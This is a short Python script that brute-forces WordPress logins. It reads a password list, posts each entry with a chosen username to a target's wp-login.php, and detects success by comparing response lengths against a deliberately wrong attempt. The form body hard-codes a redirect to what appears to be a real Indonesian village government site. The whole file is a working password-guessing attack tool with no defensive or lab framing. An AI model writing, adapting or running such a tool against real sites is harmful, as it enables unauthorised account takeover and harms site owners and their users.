from requests import *
from argparse import *

# global var

passlist=[]

# end - global var

def error(message):
    print("[*] Error : %s" %message)
    exit(1)

def send_req(url,username,passwd):

    headers={'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
    body="log="+username+"&pwd="+passwd+"&wp-submit=Log+Masuk&redirect_to=http%3A%2F%2Fbango.desa.id%2Fwp-admin%2F&testcookie=1"
    p=post(url,data=body,headers=headers)
    print('username : %s\t| password: %s'%(username,passwd))
    return len(p.text)
    

def sure_wrong(url,username):
    return send_req(url,username,'passwdIniPastiSalah')

def file_handle(filename):
    
    global file_text
    
    try:
        file_text=open(filename,'r').read()
    except:
        error("Can't open %s file" %filename)

    file_text=file_text.split('\n')
    file_text.pop()
    
def args_parser():
    
    parser=ArgumentParser()
    parser.add_argument('-t',help='URL of the target')
    parser.add_argument('-p',help='File where list of password is stored')
    parser.add_argument('-u',help='Single username that you chose')

    args=parser.parse_args()
    return args

def main(base_url,username,pass_file):

    file_handle(pass_file)
    url=base_url+'/wp-login.php'
    the_wrong=sure_wrong(url,username)

    for i in range(len(file_text)):
        if(send_req(url,username,file_text[i])!=the_wrong):
            break


if __name__=='__main__':
    
    args=args_parser()
    main(args.t, args.u, args.p)
